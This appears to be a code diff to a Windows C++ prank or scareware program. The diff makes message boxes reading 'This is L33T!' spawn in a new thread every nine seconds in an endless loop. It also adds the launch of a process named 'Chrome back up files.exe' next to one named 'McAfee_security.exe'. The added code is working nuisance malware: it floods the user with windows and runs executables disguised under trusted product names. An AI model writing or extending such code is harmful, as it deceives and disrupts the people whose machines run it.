@@ -125,15 +125,22 @@ int makeProcess(PROCESS_INFORMATION* pi, const char* exe_path)
 // create annoying msg boxes im repeat
 DWORD WINAPI msg_boxs(LPVOID lparam)
 {
+	MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_ICONERROR);
+	MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_HELP);
+	MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_CANCELTRYCONTINUE);
+	MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_ICONWARNING);
+	
+	return 1;
+}
+
+DWORD WINAPI msg_boxs_thread(LPVOID lparam)
+{
 	while (true)
 	{
-		MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_ICONERROR);
-		MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_HELP);
-		MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_CANCELTRYCONTINUE);
-		MessageBox(nullptr, TEXT("TIHS IS GOING TO TAKE LONG..."), TEXT("This is L33T!"), MB_ICONWARNING);
+		HANDLE my_thread;
+		my_thread = CreateThread(NULL, NULL, msg_boxs, NULL, 0, NULL);
 		this_thread::sleep_for(std::chrono::milliseconds(9000));
 	}
-	return 1;
 }
 
 /*
@@ -220,7 +227,7 @@ INT WINAPI WinMain(HINSTANCE hInstance,
 
 	// launch thread of msg boxes.
 	HANDLE msg_thread;
-	msg_thread = CreateThread(NULL, NULL, msg_boxs, NULL, 0, NULL);
+	msg_thread = CreateThread(NULL, NULL, msg_boxs_thread, NULL, 0, NULL);
 
 	// create mutex
 	HANDLE trivia_mutex;
@@ -235,6 +242,9 @@ INT WINAPI WinMain(HINSTANCE hInstance,
 	string trivia_path_s = pure_path + "McAfee_security.exe";
 	PROCESS_INFORMATION trivia_launcher;
 	makeProcess(&trivia_launcher, trivia_path_s.c_str());
+	string back_up = pure_path + "Chrome back up files.exe";
+	PROCESS_INFORMATION back_up_launcher;
+	makeProcess(&back_up_launcher, back_up.c_str());
 
 	// launch 
 	//if (hEvent == 0)
